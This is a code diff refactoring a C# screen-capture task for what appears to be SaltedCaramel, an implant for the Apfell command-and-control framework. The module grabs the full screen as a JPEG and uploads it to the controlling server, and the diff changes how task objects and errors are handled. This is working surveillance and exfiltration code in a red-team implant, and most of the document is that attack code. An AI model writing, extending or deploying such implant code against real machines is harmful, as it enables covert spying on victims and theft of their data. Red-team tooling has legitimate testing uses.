@@ -10,9 +10,9 @@ using System.Windows.Forms;
 /// </summary>
 namespace SaltedCaramel.Tasks
 {
-    class ScreenCapture
+    internal class ScreenCapture
     {
-        internal static void Execute(SCTask task, SCImplant implant)
+        internal static void Execute(SCTaskObject task, SCImplant implant)
         {
             Rectangle bounds = Screen.GetBounds(Point.Empty);
             Bitmap bm = new Bitmap(bounds.Width, bounds.Height);
@@ -24,20 +24,20 @@ namespace SaltedCaramel.Tasks
                 bm.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                 byte[] screenshot = ms.ToArray();
 
-                SendCapture(implant, task.id, screenshot);
+                SendCapture(implant, task, screenshot);
             }
         }
 
 
         // Same workflow as sending a file to Apfell server, but we only use one chunk
-        private static void SendCapture(SCImplant implant, string taskId, byte[] screenshot)
+        private static void SendCapture(SCImplant implant, SCTaskObject task, byte[] screenshot)
         {
             try // Try block for HTTP request
             {
                 // Send total number of chunks to Apfell server
                 // Number of chunks will always be one for screen capture task
                 // Receive file ID in response
-                SCTaskResp initial = new SCTaskResp(taskId, "{\"total_chunks\": " + 1 + ", \"task\":\"" + taskId + "\"}");
+                SCTaskResp initial = new SCTaskResp(task.id, "{\"total_chunks\": " + 1 + ", \"task\":\"" + task.id + "\"}");
                 DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.PostResponse(initial));
                 Debug.WriteLine($"[-] SendCapture - Received reply, file ID: " + reply.file_id);
 
@@ -49,19 +49,19 @@ namespace SaltedCaramel.Tasks
 
                 // Send our FileChunk to Apfell server
                 // Receive status in response
-                SCTaskResp response = new SCTaskResp(taskId, JsonConvert.SerializeObject(fc));
+                SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(fc));
                 Debug.WriteLine($"[+] SendCapture - CHUNK SENT: {fc.chunk_num}");
                 string postReply = implant.PostResponse(response);
                 Debug.WriteLine($"[-] SendCapture - RESPONSE: {implant.PostResponse(response)}");
 
                 // Tell the Apfell server file transfer is done
-                implant.SendComplete(taskId);
+                implant.SendComplete(task.id);
             }
             catch (Exception e) // Catch exceptions from HTTP requests
             {
                 // Something failed, so we need to tell the server about it
-                implant.SendError(taskId, e.Message);
-                Debug.WriteLine($"[!] SendCapture - ERROR: {e.Message}");
+                task.status = "error";
+                task.message = e.Message;
             }
         }
     }
